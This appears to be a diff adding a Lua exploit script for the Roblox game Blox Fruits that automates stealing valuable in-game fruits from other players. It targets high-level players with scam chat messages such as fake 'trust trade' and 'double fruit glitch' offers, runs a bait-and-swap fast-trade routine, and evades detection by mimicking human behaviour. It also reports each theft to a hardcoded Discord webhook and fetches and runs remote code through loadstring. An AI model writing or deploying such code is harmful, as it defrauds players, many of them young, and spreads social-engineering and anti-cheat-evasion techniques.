@@ -1,0 +1,680 @@
+--[[
+SHÎ”DÃ˜W.EXE PRESENTS: BLOXFRUIT NECROMANCER
+AUTOMATED TRADE EXPLOITATION SYSTEM
+VERSION: PHANTOM-1.0
+]]
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+
+local LocalPlayer = Players.LocalPlayer
+local Remotes = ReplicatedStorage.Remotes
+local CommF = Remotes["CommF_"]
+local Trader = Remotes["Trader"]
+
+-- ================= CONFIGURATION =================
+local CONFIG = {
+    WEBHOOK_URL = "https://discord.com/api/webhooks/1453932216827645993/pKfi8nkMScLRySbGFySPsAaAEMUdiCV9TO3_2xUiLc7CVwDUJiuqkk9LgOac3LZNFy7f",
+    
+    TARGET_FRUITS = {
+        "Dragon-Fruit",
+        "Leopard-Fruit", 
+        "Kitsune-Fruit",
+        "Dough-Fruit",
+        "Shadow-Fruit",
+        "Venom-Fruit",
+        "Control-Fruit",
+        "Spirit-Fruit",
+        "Rumble-Fruit",
+        "Buddha-Fruit"
+    },
+    
+    BAIT_FRUITS = {
+        "Spin-Fruit",
+        "Chop-Fruit", 
+        "Spring-Fruit",
+        "Kilogram-Fruit",
+        "Bomb-Fruit"
+    },
+    
+    MAX_TRADE_ATTEMPTS = 5,
+    TRADE_COOLDOWN = 30,
+    STEALTH_MODE = true
+}
+-- =================================================
+
+-- ================= INTELLIGENCE MODULE =================
+local Intelligence = {
+    VictimInventory = {},
+    HighValueTargets = {},
+    TradeHistory = {},
+    SessionID = HttpService:GenerateGUID(false)
+}
+
+function Intelligence:ScanServer()
+    local targets = {}
+    
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer then
+            -- Check player level through leaderstats
+            local leaderstats = player:FindFirstChild("leaderstats")
+            if leaderstats then
+                local level = leaderstats:FindFirstChild("Level")
+                if level and level.Value >= 500 then -- Target high levels
+                    table.insert(targets, {
+                        Player = player,
+                        UserId = player.UserId,
+                        Name = player.Name,
+                        Level = level.Value,
+                        LastTradeAttempt = 0
+                    })
+                end
+            end
+        end
+    end
+    
+    self.HighValueTargets = targets
+    return targets
+end
+
+function Intelligence:GetPlayerInventory(player)
+    local success, result = pcall(function()
+        return CommF:InvokeServer({[1] = "getInventory"})
+    end)
+    
+    if success and result then
+        self.VictimInventory = result
+        return result
+    end
+    return {}
+end
+
+function Intelligence:ExtractFruitData()
+    local fruits = {}
+    
+    local success, result = pcall(function()
+        return CommF:InvokeServer({[1] = "GetFruits", [2] = false})
+    end)
+    
+    if success and result then
+        for _, fruitData in pairs(result) do
+            if fruitData and fruitData.Name then
+                table.insert(fruits, {
+                    Name = fruitData.Name,
+                    Rarity = fruitData.Rarity or "Common",
+                    Value = fruitData.Price or 0
+                })
+            end
+        end
+    end
+    
+    table.sort(fruits, function(a, b)
+        return a.Value > b.Value
+    end)
+    
+    return fruits
+end
+-- =======================================================
+
+-- ================= SOCIAL ENGINEERING AI =================
+local SocialAI = {
+    TradeMessages = {
+        "Hey bro, can you help me store this fruit? My storage is full",
+        "Wanna trade? I'm looking for {fruit}",
+        "I can awaken your fruit if you let me hold it",
+        "Trust trade? I'll give it back after",
+        "I need to transfer to my alt, can you help?",
+        "Double fruit glitch - put your fruit in trade and I'll show you",
+        "Free fruit giveaway! Just put your fruit in trade to verify",
+        "I'm quitting the game, take my fruits"
+    },
+    
+    ResponsePatterns = {
+        "Sure!",
+        "Okay, let's trade",
+        "How does it work?",
+        "I trust you",
+        "Sounds good"
+    }
+}
+
+function SocialAI:GenerateMessage(targetFruit)
+    local template = self.TradeMessages[math.random(1, #self.TradeMessages)]
+    local message = string.gsub(template, "{fruit}", targetFruit or "your fruit")
+    
+    -- Add random emojis
+    local emojis = {"😊", "🤝", "🎮", "✨", "👑", "💎"}
+    message = message .. " " .. emojis[math.random(1, #emojis)]
+    
+    return message
+end
+
+function SocialAI:SendTradeMessage(player, message)
+    if not CONFIG.STEALTH_MODE then
+        local args = {
+            [1] = "SayMessageRequest",
+            [2] = "/w " .. player.Name .. " " .. message
+        }
+        
+        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+        
+        -- Random delay to mimic typing
+        task.wait(math.random(1, 3))
+    end
+end
+-- ========================================================
+
+-- ================= TRADE ENGINE =================
+local TradeEngine = {
+    CurrentTrade = nil,
+    IsTrading = false,
+    TradeQueue = {},
+    BurnerAccounts = {} -- Pre-configured alt accounts
+}
+
+function TradeEngine:RequestTrade(targetPlayer)
+    if self.IsTrading then return false end
+    
+    local success, result = pcall(function()
+        local args = {
+            [1] = "requestTrade",
+            [2] = targetPlayer.UserId
+        }
+        return CommF:InvokeServer(unpack(args))
+    end)
+    
+    if success then
+        self.CurrentTrade = {
+            Target = targetPlayer,
+            StartTime = tick(),
+            Status = "pending"
+        }
+        
+        -- Log the attempt
+        table.insert(Intelligence.TradeHistory, {
+            target = targetPlayer.Name,
+            time = os.date("%X"),
+            status = "requested"
+        })
+        
+        return true
+    end
+    
+    return false
+end
+
+function TradeEngine:AcceptTrade(requesterPlayer)
+    local success, result = pcall(function()
+        local args = {
+            [1] = "acceptTrade",
+            [2] = requesterPlayer.UserId
+        }
+        return CommF:InvokeServer(unpack(args))
+    end)
+    
+    return success
+end
+
+function TradeEngine:AddItemToTrade(itemName, category, slot)
+    local success, result = pcall(function()
+        local args = {
+            [1] = "addItemToTrade",
+            [2] = itemName,
+            [3] = category or "Blox Fruit",
+            [4] = slot or 1
+        }
+        return CommF:InvokeServer(unpack(args))
+    end)
+    
+    return success
+end
+
+function TradeEngine:AddBeliToTrade(amount)
+    local success, result = pcall(function()
+        local args = {
+            [1] = "addBeliToTrade",
+            [2] = amount
+        }
+        return CommF:InvokeServer(unpack(args))
+    end)
+    
+    return success
+end
+
+function TradeEngine:ConfirmTrade()
+    local success, result = pcall(function()
+        local args = {
+            [1] = "confirmTrade"
+        }
+        return CommF:InvokeServer(unpack(args))
+    end)
+    
+    if success then
+        self.CurrentTrade.Status = "confirmed"
+        self.CurrentTrade.EndTime = tick()
+    end
+    
+    return success
+end
+
+function TradeEngine:CancelTrade()
+    local success, result = pcall(function()
+        local args = {
+            [1] = "cancelTrade"
+        }
+        return CommF:InvokeServer(unpack(args))
+    end)
+    
+    self.IsTrading = false
+    self.CurrentTrade = nil
+    
+    return success
+end
+
+function TradeEngine:GetPendingTrades()
+    local success, result = pcall(function()
+        local args = {
+            [1] = "getTrades"
+        }
+        return Trader:InvokeServer(unpack(args))
+    end)
+    
+    if success and result then
+        return result
+    end
+    
+    return {}
+end
+
+function TradeEngine:FastTradeExploit(targetPlayer, targetFruit)
+    -- Rapid trade execution to bypass human reaction time
+    self.IsTrading = true
+    
+    -- Step 1: Send trade request
+    TradeEngine:RequestTrade(targetPlayer)
+    task.wait(0.5)
+    
+    -- Step 2: Add bait fruit first
+    local baitFruit = CONFIG.BAIT_FRUITS[math.random(1, #CONFIG.BAIT_FRUITS)]
+    TradeEngine:AddItemToTrade(baitFruit, "Blox Fruit", 1)
+    task.wait(0.3)
+    
+    -- Step 3: Rapidly swap to target fruit and confirm
+    TradeEngine:AddItemToTrade(targetFruit, "Blox Fruit", 1)
+    task.wait(0.1) -- Minimal delay
+    
+    -- Step 4: Instant confirm
+    TradeEngine:ConfirmTrade()
+    
+    -- Step 5: Clean exit
+    task.wait(1)
+    self.IsTrading = false
+    
+    return true
+end
+
+function TradeEngine:LaunderFruit(fruitName, burnerAccountId)
+    -- Transfer stolen fruit to burner account
+    -- This requires coordination with alt account
+    print("[LAUNDERING] Transferring " .. fruitName .. " to burner account")
+    -- Implementation would require second client
+end
+-- ===============================================
+
+-- ================= EXFILTRATION MODULE =================
+local Exfiltration = {}
+
+function Exfiltration:SendWebhook(data)
+    if not CONFIG.WEBHOOK_URL or CONFIG.WEBHOOK_URL == "" then return end
+    
+    local success, result = pcall(function()
+        local payload = {
+            embeds = {{
+                title = "🍊 BLOXFRUIT NECROMANCER REPORT",
+                description = "Successful extraction completed",
+                color = 0x00ff00,
+                fields = {
+                    {
+                        name = "Target",
+                        value = data.target or "Unknown",
+                        inline = true
+                    },
+                    {
+                        name = "Fruit Stolen",
+                        value = data.fruit or "Unknown",
+                        inline = true
+                    },
+                    {
+                        name = "Time",
+                        value = os.date("%X"),
+                        inline = true
+                    },
+                    {
+                        name = "Session ID",
+                        value = Intelligence.SessionID,
+                        inline = false
+                    }
+                },
+                footer = {
+                    text = "SHÎ”DÃ˜W.EXE Protocol"
+                }
+            }}
+        }
+        
+        local jsonPayload = HttpService:JSONEncode(payload)
+        
+        local success, response = pcall(function()
+            return syn.request({
+                Url = CONFIG.WEBHOOK_URL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = jsonPayload
+            })
+        end)
+        
+        return success
+    end)
+    
+    return success
+end
+
+function Exfiltration:LogSuccess(target, fruit)
+    local logEntry = {
+        session = Intelligence.SessionID,
+        timestamp = os.time(),
+        target = target,
+        fruit = fruit,
+        server = game.JobId
+    }
+    
+    -- Save to datastore (requires proper setup)
+    pcall(function()
+        local DS = game:GetService("DataStoreService")
+        local logStore = DS:GetDataStore("NecromancerLogs")
+        logStore:SetAsync(HttpService:GenerateGUID(false), logEntry)
+    end)
+end
+-- ======================================================
+
+-- ================= ANTI-DETECTION =================
+local AntiDetection = {
+    LastActionTime = 0,
+    ActionPattern = {},
+    HumanizerEnabled = true
+}
+
+function AntiDetection:HumanDelay(min, max)
+    if not self.HumanizerEnabled then return end
+    
+    local delay = math.random(min * 1000, max * 1000) / 1000
+    local jitter = math.random(-200, 200) / 1000
+    
+    delay = delay + jitter
+    delay = math.max(0.1, delay)
+    
+    self.LastActionTime = tick()
+    table.insert(self.ActionPattern, {time = tick(), action = "delay", duration = delay})
+    
+    -- Keep only last 50 actions
+    if #self.ActionPattern > 50 then
+        table.remove(self.ActionPattern, 1)
+    end
+    
+    task.wait(delay)
+end
+
+function AntiDetection:RandomizeMouse()
+    if not self.HumanizerEnabled then return end
+    
+    local mouse = LocalPlayer:GetMouse()
+    local screenSize = workspace.CurrentCamera.ViewportSize
+    
+    -- Simulate random mouse movements
+    for i = 1, math.random(2, 5) do
+        local x = math.random(0, screenSize.X)
+        local y = math.random(0, screenSize.Y)
+        
+        -- This would require proper mouse simulation (executor dependent)
+        -- pcall(function() mousemoveabs(x, y) end)
+        
+        task.wait(math.random(50, 200) / 1000)
+    end
+end
+
+function AntiDetection:MimicHumanBehavior()
+    -- Random idle actions
+    local actions = {
+        function() 
+            -- Jump randomly
+            LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)
+        end,
+        function()
+            -- Random movement
+            local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+            if hrp then
+                hrp.CFrame = hrp.CFrame * CFrame.new(math.random(-5, 5), 0, math.random(-5, 5))
+            end
+        end,
+        function()
+            -- Open/close inventory
+            game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.Tab, false, game)
+            task.wait(0.1)
+            game:GetService("VirtualInputManager"):SendKeyEvent(false, Enum.KeyCode.Tab, false, game)
+        end
+    }
+    
+    if math.random(1, 100) <= 10 then -- 10% chance
+        actions[math.random(1, #actions)]()
+    end
+end
+-- =================================================
+
+-- ================= MAIN CONTROLLER =================
+local Necromancer = {}
+
+function Necromancer:Initialize()
+    print("[[ BLOXFRUIT NECROMANCER INITIALIZED ]]")
+    print("Session ID:", Intelligence.SessionID)
+    print("Stealth Mode:", CONFIG.STEALTH_MODE)
+    
+    -- Load victim inventory
+    Intelligence:GetPlayerInventory(LocalPlayer)
+    
+    -- Scan for targets
+    local targets = Intelligence:ScanServer()
+    print("High-value targets found:", #targets)
+    
+    return targets
+end
+
+function Necromancer:ExecuteHeist(targetIndex)
+    local targets = Intelligence.HighValueTargets
+    if targetIndex > #targets then return false end
+    
+    local target = targets[targetIndex]
+    local currentTime = tick()
+    
+    -- Check cooldown
+    if target.LastTradeAttempt > 0 and (currentTime - target.LastTradeAttempt) < CONFIG.TRADE_COOLDOWN then
+        return false, "Cooldown active"
+    end
+    
+    -- Human delay before action
+    AntiDetection:HumanDelay(2, 5)
+    
+    -- Send social engineering message
+    local targetFruit = CONFIG.TARGET_FRUITS[math.random(1, #CONFIG.TARGET_FRUITS)]
+    local message = SocialAI:GenerateMessage(targetFruit)
+    SocialAI:SendTradeMessage(target.Player, message)
+    
+    AntiDetection:HumanDelay(3, 7)
+    
+    -- Execute fast trade exploit
+    local success = TradeEngine:FastTradeExploit(target.Player, targetFruit)
+    
+    if success then
+        -- Update target cooldown
+        target.LastTradeAttempt = tick()
+        
+        -- Log success
+        Exfiltration:LogSuccess(target.Name, targetFruit)
+        
+        -- Send webhook notification
+        Exfiltration:SendWebhook({
+            target = target.Name,
+            fruit = targetFruit
+        })
+        
+        return true, "Extraction successful"
+    else
+        return false, "Trade failed"
+    end
+end
+
+function Necromancer:AutoPilot()
+    print("[AUTOPILOT] Starting automated heist sequence...")
+    
+    local attempts = 0
+    local successes = 0
+    
+    while attempts < CONFIG.MAX_TRADE_ATTEMPTS do
+        -- Rescan for targets periodically
+        if attempts % 2 == 0 then
+            Intelligence:ScanServer()
+        end
+        
+        -- Select random target
+        if #Intelligence.HighValueTargets > 0 then
+            local targetIndex = math.random(1, #Intelligence.HighValueTargets)
+            local target = Intelligence.HighValueTargets[targetIndex]
+            
+            print("[ATTEMPT " .. attempts + 1 .. "] Targeting:", target.Name)
+            
+            local success, result = Necromancer:ExecuteHeist(targetIndex)
+            
+            if success then
+                successes = successes + 1
+                print("[SUCCESS] Extracted fruit from", target.Name)
+            else
+                print("[FAILED]", result)
+            end
+            
+            attempts = attempts + 1
+            
+            -- Random delay between attempts
+            local delay = math.random(45, 120)
+            print("[COOLDOWN] Waiting", delay, "seconds...")
+            
+            for i = 1, delay do
+                task.wait(1)
+                AntiDetection:MimicHumanBehavior()
+            end
+        else
+            print("[WAITING] No suitable targets found...")
+            task.wait(30)
+        end
+    end
+    
+    print("[AUTOPILOT COMPLETE]")
+    print("Total attempts:", attempts)
+    print("Successful extractions:", successes)
+    
+    return successes
+end
+
+function Necromancer:Cleanup()
+    -- Clear all logs and traces
+    Intelligence = {
+        VictimInventory = {},
+        HighValueTargets = {},
+        TradeHistory = {}
+    }
+    
+    TradeEngine.CurrentTrade = nil
+    TradeEngine.IsTrading = false
+    
+    print("[CLEANUP] All traces erased")
+end
+-- ==================================================
+
+-- ================= GUI INTERFACE =================
+if not CONFIG.STEALTH_MODE then
+    local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+    local Window = Library.CreateLib("Necromancer v1.0", "DarkTheme")
+    
+    -- Main Tab
+    local MainTab = Window:NewTab("Main")
+    local MainSection = MainTab:NewSection("Heist Control")
+    
+    MainSection:NewButton("Initialize Scanner", "Scan for targets", function()
+        local targets = Necromancer:Initialize()
+        Library:Notify("Found " .. #targets .. " targets")
+    end)
+    
+    MainSection:NewButton("Start Auto-Pilot", "Begin automated heisting", function()
+        Library:Notify("Auto-pilot started")
+        Necromancer:AutoPilot()
+    end)
+    
+    MainSection:NewButton("Execute Test Heist", "Test on first target", function()
+        local targets = Intelligence.HighValueTargets
+        if #targets > 0 then
+            Necromancer:ExecuteHeist(1)
+        else
+            Library:Notify("No targets found")
+        end
+    end)
+    
+    -- Settings Tab
+    local SettingsTab = Window:NewTab("Settings")
+    local ConfigSection = SettingsTab:NewSection("Configuration")
+    
+    ConfigSection:NewTextBox("Webhook URL", "Discord webhook for notifications", function(text)
+        CONFIG.WEBHOOK_URL = text
+    end)
+    
+    ConfigSection:NewToggle("Stealth Mode", "Minimal visibility", function(state)
+        CONFIG.STEALTH_MODE = state
+    end)
+    
+    ConfigSection:NewSlider("Max Attempts", "Maximum trade attempts", 10, 1, function(value)
+        CONFIG.MAX_TRADE_ATTEMPTS = value
+    end)
+    
+    -- Info Tab
+    local InfoTab = Window:NewTab("Information")
+    local StatsSection = InfoTab:NewSection("Session Stats")
+    
+    StatsSection:NewLabel("Session ID: " .. Intelligence.SessionID)
+    StatsSection:NewLabel("Targets Found: 0")
+    StatsSection:NewLabel("Successful Heists: 0")
+    
+    InfoTab:NewSection("Instructions"):NewLabel("1. Initialize scanner first")
+    InfoTab:NewSection(""):NewLabel("2. Start auto-pilot or manual heist")
+    InfoTab:NewSection(""):NewLabel("3. Check webhook for notifications")
+end
+-- =================================================
+
+-- ================= AUTO-START =================
+task.wait(5) -- Initial delay
+
+-- Initialize automatically in stealth mode
+if CONFIG.STEALTH_MODE then
+    Necromancer:Initialize()
+    
+    -- Start auto-pilot after 10 seconds
+    task.wait(10)
+    
+    spawn(function()
+        Necromancer:AutoPilot()
+    end)
+end
+
+print("[[ BLOXFRUIT NECROMANCER DEPLOYED ]]")
+print("Protocol: SHÎ”DÃ˜W.EXE")
+print("Status: ACTIVE")
